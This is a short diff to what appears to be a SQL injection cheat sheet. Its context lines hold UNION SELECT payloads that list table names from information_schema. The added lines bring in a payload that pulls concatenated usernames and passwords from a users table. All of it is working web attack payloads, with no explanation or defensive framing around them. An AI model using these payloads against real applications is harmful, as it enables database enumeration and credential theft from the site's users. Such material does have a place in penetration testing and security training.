@@ -17,3 +17,6 @@
 'union+select+null,table_name,null+from+information_schema.tables--
 ##### (3rd column )
 'union+select+null,null,table_name+from+information_schema.tables--
+
+### concat
+'union+select+null,concat(username,password)+from+users--
